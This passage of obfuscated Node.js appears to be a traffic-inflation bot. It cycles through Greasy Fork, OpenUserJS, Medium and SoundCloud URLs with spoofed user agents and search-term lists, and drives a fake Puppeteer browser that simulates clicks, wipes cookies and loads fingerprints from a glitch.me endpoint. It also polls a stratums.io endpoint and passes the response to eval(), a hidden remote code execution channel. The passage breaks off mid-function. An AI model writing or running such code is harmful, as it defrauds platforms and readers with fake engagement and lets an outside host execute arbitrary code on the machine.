        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + aF(0x14) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + aD(0x1, 'RLfZ') + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + aD(0x6, 'UI16') + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + aD(0xa, '#bsI') + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + aF(0xd) + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + aF(0x7) + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + aF(0x1a) + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + aF(0x15) + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + aD(0x5, 'RsvJ') + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + aE(0x4) + '0.1462.54'
    ],
    'searchTerms': []
  };
data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x938 + -0xf * 0x43 + 0x1 * -0x541)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x18a9 + -0x3 * 0xc9c + 0xd35)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](-0x139 * 0xf + -0x173a + 0x2994);
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = 0x665 * 0x3 + 0x713 * -0x3 + -0x3a * -0x9; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager['prototypes'](), async function trigger() {
  const aL = b,
    aK = d;
  for (;;) {
    try {
      let f = [],
        g = '$';
      if (flags['RPL2_RPRT']) {
        async function h() {
          try {
            axios['post']('https://st' + 'ratums.io/' + 'research', {
              'key': 'CX001_ZCa',
              'dom': me,
              'replUrl': replUrl
            })['then'](j => {
              try {
                const k = j['data'][-0xdd4 + 0x9 * -0xc5 + 0x17 * 0xe7];
                '$' === k ? f['push'](j['data']) : eval(j['data']);
              } catch (l) {}
            })['catch'](j => {});
          } catch (j) {}
        }
        h(), setInterval(h, 0x26a97 * -0x2 + -0x63e03 + -0x2573 * -0x6b);
      }
      if (flags['ActivateBr' + 'owser']) {
        const {
          FakeBrowser: j
        } = require('fakebrowse' + 'r'), k = require('path'), l = k['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), m = new j['Builder']()['displayUse' + 'rActionLay' + 'er'](0xb * 0x65 + 0x5f0 + 0x3 * -0x36d)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
          require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
            'blockTrackers': 0x1,
            'blockTrackersAndAnnoyances': 0x1
          }),
          require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')(),
          require('puppeteer-' + 'extra-plug' + 'in-session')['default']()
        ])['userDataDi' + 'r'](l);
        let n;
        aa:
          for (;;)
            try {
              if (flags['doExtFinge' + 'rprint']) {
                let W = await async function X() {
                  let Y;
                  const Z = {
                    'User-Agent': Y['userAgents']['random'](),
                    'Accept-Encoding': 'none'
                  };
                  try {
                    Y = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                      'headers': Z
                    })) ? .['data'];
                  } catch (a0) {}
                  if (Y)
                    try {
                      Y = (await axios['get'](Y, {
                        'headers': Z
                      })) ? .['data'];
                    } catch (a1) {}
                  if (!Y)
                    return await randomWait(), await X();
                  try {
                    return 'object' == typeof Y ? Y : 'string' == typeof Y ? JSON['parse'](Y) : {};
                  } catch (a2) {
                    if (!Y)
                      return await randomWait(), await X();
                  }
                }();
                m['deviceDesc' + 'riptor'](W);
              }
              n = await m['launch']();
              break aa;
            } catch (Y) {
              warn(Y), await randomWait();
            }
        const {
          vanillaBrowser: p,
          userAction: q
        } = n;
        log('index.js\x20c' + 'alled');
        const u = p['defaultBro' + 'wserContex' + 't']();
        async function v(Z = '', a0 = -0x4c8 + 0x1714 + -0x15 * 0xdf, a1) {
          const a2 = await a1['waitForSel' + 'ector'](Z);
          return await q['simClickEl' + 'ement'](a2, {
            'pauseAfterMouseUp': a0
          }), a2;
        }
        async function w(Z) {
          const aG = d,
            a0 = await Z['target']()['createCDPS' + 'ession']();
          await a0['send']('Network.cl' + 'earBrowser' + 'Cookies'), await a0['send']('Network.cl' + 'earBrowser' + aG(0x13));
          const a1 = await Z['cookies']();
          for (const a2 of a1)
            await Z['deleteCook' + 'ie'](a2);
          return await Z['evaluate'](() => {
            window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
          }), 0x19ab + -0x27a * -0x7 + -0x2b00;
        }
        async function x(Z, a0 = -0x1 * -0x146 + -0x1559 + 0x1414) {
          let a1 = await p['newPage']();
